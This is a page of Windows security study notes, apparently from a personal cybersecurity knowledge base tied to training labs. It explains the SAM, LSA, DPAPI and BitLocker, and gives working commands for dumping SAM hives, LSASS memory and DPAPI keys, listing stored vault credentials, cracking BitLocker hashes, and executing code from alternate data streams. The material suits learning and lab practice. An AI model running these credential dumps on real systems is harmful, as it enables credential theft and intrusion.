# Windows Security

[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

<div class="row row-cols-lg-2"><div>

Windows has built-in tools and features to increase the security and reduce the attack surface exploitable for hackers.

Formerly known as Windows Defender, Windows Security provides features to help ensure the safety and privacy of the system.

* ü™≤ Antivirus
* üí∞ Ransomware protection
* üî´ Network Firewall
* üîí [SmartScreen](https://learn.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-smartscreen/microsoft-defender-smartscreen-overview)
* ...
</div><div>

It's important to keep the operating system [up to date](/cybersecurity/blue-team/topics/updates.md). Windows Update is responsible for downloading and installing them.

Updates are usually released on the 2nd Tuesday of each month, which is often called "Patch Tuesday."

You can open Windows Update from a terminal using: `control /name Microsoft.WindowsUpdate`.

Microsoft frequently releases [security updates](https://msrc.microsoft.com/update-guide/en-us) for their products.

## Authentication & Authorization

<div class="row row-cols-lg-2"><div>

#### Security Accounts Manager (SAM)

[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

The SAM (Security Accounts Manager) database is a local database present on every Windows computer. It is used for authentication. It stores account information including usernames and password hashes.

Modern versions of Windows use the NT hash format, commonly referred to as NTLM, as the previous format was LM.

The database is stored in: `/Windows/System32/config/SAM/` <small>(admin-only)</small>.

üìö The SAM database is mounted in the registry at `hklm/sam`.

‚ö†Ô∏è The SAM database is often partially encrypted using SYSKEY.

#### SYSKEY, Bootkey, and System Hive

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

SYSKEY is a security feature that partially encrypts the SAM database with a key to protect against offline cracking.

* SYSKEY define the configuration of the bootkey
* The bootkey is the key used to encrypt the SAM database
* The system hive contains the bootkey.

üìö The system hive is stored in: `/Windows/System32/config/System/` <small>(admin-only)</small> and mounted in the registry at `hklm/system`.

#### Security Hive

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

The security hive is used to store security configuration, but it's also used to store cached domain-joined credentials.

üìö It is mounted in the registry at `hklm/security`.

#### Security Identifier (SID)

[![windowsfundamentals](../../../cybersecurity/_badges/htb/windowsfundamentals.svg)](https://academy.hackthebox.com/course/preview/windows-fundamentals)

Each object (user, service, etc.) that can be authenticated is called "Security Principal," and has a security identifier (SID). They are used to verify that the user is authorized to an action.

A SID is a concatenation of a domain identifier and a relative identifier (RID). They start with `S-`. The last  hyphen-separated value is the RID.

```ps
PS> whoami /user
PS> wmic useraccount get name,sid
```
</div><div>

#### Access Control

[![windowsfundamentals](../../../cybersecurity/_badges/htb/windowsfundamentals.svg)](https://academy.hackthebox.com/course/preview/windows-fundamentals)
[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

The access to any resources is managed by Access Control Entries (ACEs) in Access Control Lists (ACLs). An ACL is a set of ACEs.

Each ACE specifies the permissions <small>(R, W, X, etc.)</small> granted or denied for a particular user or group <small>(a SID)</small> over a "securable object". A securable object refers to a resource that can be secured <small>(files, services, etc.)</small>.

A security descriptor is a data structure associated with a securable object. It contains information such as:
 
* **Discretionary Access Control List (DACL)**: A list of ACEs 
* **System Access Control List (SACL)**: Optionally, a list that specifies which security events should be audited.

#### Access Token

[![windows_privilege_escalation](../../../cybersecurity/_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

Access tokens are dynamically generated by Windows. They represent the security context of a thread/process. It's a data structure to store information allowing Windows to check if a process is allowed or not to access a securable object.

* User SID and Group SIDs
* Privilege and permissions beyond an object DACLS
* ...

#### Local Security Authority (LSA)

[![windowsfundamentals](../../../cybersecurity/_badges/htb/windowsfundamentals.svg)](https://academy.hackthebox.com/course/preview/windows-fundamentals)
[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

The Local Security Authority (LSA) is a process responsible for security-related functions in the operating system.

* Authenticating users
* Enforcing security policies
* Generating access tokens <small>(contains security information such as privileges, used by processes/... to authorize users)</small>

It's managed by `lsass.exe`, the Local Security Authority Subsystem Service (LSASS).

## BitLocker Encrypted Drive

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

<div class="row row-cols-lg-2"><div>

BitLocker is a full disk encryption feature on Windows. We must unlock the drive at boot in order to read its contents.

* üå± USB key
* üòé Pin or Password 
* üç∑ Trusted Platform Module (TPM)
* ‚ö†Ô∏è Network Unlock

A recovery key can alternatively be used. It's a randomly generated 48-digit string of numbers. It can be saved on [Active Directory](/operating-systems/cloud/active-directory/_knowledge/index.md), on your Microsoft Account, on an external drive, etc.
</div><div>

Bitlocker needs the drive to have two partitions. The first partition has the necessary files to start the system, while the other has the full operating system and our files.

Assuming you mounted the locked partition in `/dev/xxxp2`:

```shell!
$ # unlock and map in /dev/mapper/mytag
$ sudo cryptsetup bitlkOpen /dev/xxxp2 mytag
$ sudo cryptsetup bitlkClose mytag
```

You can extract the user password (`$0`/`$1`) or the recovery key (`$2`/`$3`). You can then try [hash cracking](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking) or [bitcracker](https://github.com/e-ago/bitcracker) <small>(0.7k ‚≠ê, 2021 ü™¶)</small>.

```shell!
$ # https://openwall.info/wiki/john/OpenCL-BitLocker
$ bitlocker2john -i xxx.vhd > myhashes
$ grep "bitlocker\$0" myhashes > myhash
$ hashcat -m 22100 myhash wordlist
```

#### Dump Credentials From The SAM Database

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

* **Dump SAM database and other hives**

If you have enough privileges to access the registry <small>(not necessarily admin, but not a normal user)</small>, you can dump the three hives:

```ps
PS> reg save hklm\system C:\XXX\system.hive
PS> reg save hklm\sam C:\XXX\sam.hive
PS> reg save hklm\security C:\XXX\security.hive
$ nxc smb IP --local-auth -u xxx -p yyy --sam # remote dump
```

* **Analysis** on Windows with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)

```shell!
mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive
mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive /security:./security.hive
```

* **Analysis of dumped database** on Linux

Use [file transfer methods](/cybersecurity/red-team/_knowledge/topics/file_transfer.md) such as SMB and [secretsdump](/operating-systems/networking/protocols/tools/impacket.md) to dump them. We would then try to [crack](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking) or pass the hash.

```shell!
$ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
```

On Windows, you can use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.5k ‚≠ê)</small> too.

#### Dump Credentials Protected By The DPAPI

[![dpapi_extracting_passwords](../../../cybersecurity/_badges/hacktricks/windows_hardening/windows_local_privilege_escalation/dpapi_extracting_passwords.svg)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
[![dpapi](../../../cybersecurity/_badges/ired/credential_access_and_credential_dumping/dpapi.svg)](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++)
[![chrome](../../../cybersecurity/_badges/thm-p/chrome.svg)](https://tryhackme.com/room/chrome)

The [Data Protection API](https://en.wikipedia.org/wiki/Data_Protection_API) (DPAPI) is a component of Windows that can be used to encrypt data, and is used by software such as for the Google Chrome saved passwords feature ([more on that here](/cybersecurity/red-team/s4.privesc/others/browser.md)).

The user password is encrypted to generate a **DPAPI master key**, usually stored in `%appdata%\Roaming\Microsoft\Protect\` <small>(hidden)</small>.

* üìö Each folder name is from the [SID](#security-identifier-sid) of the associated user
* üìö The file inside the SID folder is the user DPAPI master key file
* üîê We can [crack the user password from the master key file](/cybersecurity/cryptography/algorithms/hashing/index.md)
* üîê If we have the user password, we can extract the master key. With the SID `S-A-B-C-D-E-F-G` and the filename `H-I-J-K-L`:

```shell!
$ pypykatz dpapi prekey password S-A-B-C-D-E-F-G password -o ./prekey
$ pypykatz dpapi masterkey ./H-I-J-K-L ./prekey -o mkf
```
```shell!
$ impacket-dpapi masterkey -file H-I-J-K-L -sid S-A-B-C-D-E-F-G -password password
```

* üîê We can extract the master key from the LSASS process memory
</div><div>

#### Dump Credentials From The Credential Manager

Windows has a feature called [credential manager](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) used by apps to store credentials. Each user has one usually stored in `%appdata%\Local\Microsoft\Credentials\`.

It can be accessed from the GUI, or using the command line:

```ps
PS> vaultcmd /list
PS> vaultcmd /listcreds:"Web Credentials" /all
PS> vaultcmd /listcreds:"Windows Credentials" /all
```

You can also use [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md):

```shell!
mimikatz# vault::list
mimikatz# vault::cred
```

<br>

#### Dump Credentials From LSASS Process

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![windows_privilege_escalation](../../../cybersecurity/_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

The LSASS process that contains the DPAPI masterkey for the logged user. It can be used to decrypt credentials for applications that use it. It also contains tickets, and [wDIGEST](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-authentication) cleartext credentials.

* **Dump and Analysis** on Windows with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)

```shell!
mimikatz# lsadump::lsa /patch
mimikatz# sekurlsa::dpapi
```

* **Dump and Analysis** using [nxc](/cybersecurity/red-team/tools/cracking/auth/nxc.md)

```ps
$ nxc smb IP --local-auth -u xxx -p yyy --lsa # dump secrets
```

* **Dump LSA Process Memory** <small>(Admin Shell Required/No Admin for TM?)</small>

```shell!
PS> tasklist /svc | findstr "lsa"
lsass.exe          4242
PS> Get-Process lsass | Select Id
  Id
  --
  4242
PS> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4242 C:\lsass.dmp full
<detected by antivirus>
```

```ps
PS> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp
<admin required>
```

Lastly, you can also open the task manager, right-click on the LSAP process and select 'Create dump file.'

* **Analyzing LSA Process Dump** on Windows using [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)

```shell!
mimikatz# sekurlsa::minidump ./lsass.dmp # load
mimikatz# sekurlsa::logonpasswords
```

* **Analyzing LSA Process Dump** on Linux using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md)

```shell!
$ pypykatz lsa minidump lsass.dmp
```

## Random Notes

<div class="row row-cols-lg-2"><div>

#### Alternate Data Streams (ADS)

[![adventofcyber2](../../../cybersecurity/_badges/thm/adventofcyber2/day21.svg)](https://tryhackme.com/room/adventofcyber2)

On NTFS filesystem, ADS allows files to have more than one stream of data. By default, every file has one stream called `:$DATA`.

```ps
PS> Get-Item -Path SomeFile -Stream * # list streams
PSPath        : Microsoft.PowerShell.Core\FileSystem::XXX\toto.pdf::$DATA
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::XXX
PSChildName   : toto.pdf::$DATA
PSDrive       : XXX
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : XXX\toto.pdf
Stream        : :$DATA
Length        : 0
```

They can be used by Windows to store data, such as identifiers telling Windows that this file was downloaded from the Internet.

Hackers can use that to store malicious code inside a file. This code may be executed by a vulnerable application loading the file.

```ps
PS> $(Resolve-Path .\file.exe:stream) # vulnerable PS call
PS> wmic process call create $(Resolve-Path file.exe:stream)
```
</div><div>

#### Volume Shadow Copy Service (VSS)

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![windows_privilege_escalation](../../../cybersecurity/_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![adventofcyber2](../../../cybersecurity/_badges/thm/adventofcyber2/day23.svg)](https://tryhackme.com/room/adventofcyber2)

The Volume Shadow Copy Service (VSS) is handling the creation, and management of shadow copies/snapshots of the data backed up. 

It stores data in the "volume information" of each drive that has the feature enabled. They may allow a system admin to restore the system after an attack. Hackers will most likely check them and delete them.

To manage them, right-click on a hard-drive, and select "Shadow copies." Shadow copies can be stored externally.

```ps
PS> vssadmin CREATE SHADOW /For=C:
PS> vssadmin list volumes
```

üìö To restore a shadow copy, right-click on a folder, navigate to 'previous versions', select one, and press 'restore.'

‚û°Ô∏è See also: [Volume Shadow Copy Service](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) and [diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow).

#### PowerShell SecureString

[![powershell_securestring](../../../cybersecurity/_badges/rootme/app_script/powershell_securestring.svg)](https://www.root-me.org/en/Challenges/App-Script/Powershell-SecureString)

PowerShell SecureString class represents text that should be kept confidential. You can create one using:

```ps
PS> $SecurePassword = ConvertTo-SecureString "Toto" -AsPlainText -Force
PS> $SecurePassword = Get-Content xxx.enc | ConvertTo-SecureString -key $(Get-Content "xxx.key")
```

To decrypt one, there are various methods:

```ps
PS> $UnsecurePassword = ConvertFrom-SecureString -SecureString $SecurePassword -AsPlainText
PS> $UnsecurePassword = (New-Object PSCredential 0, $SecurePassword).GetNetworkCredential().Password
```
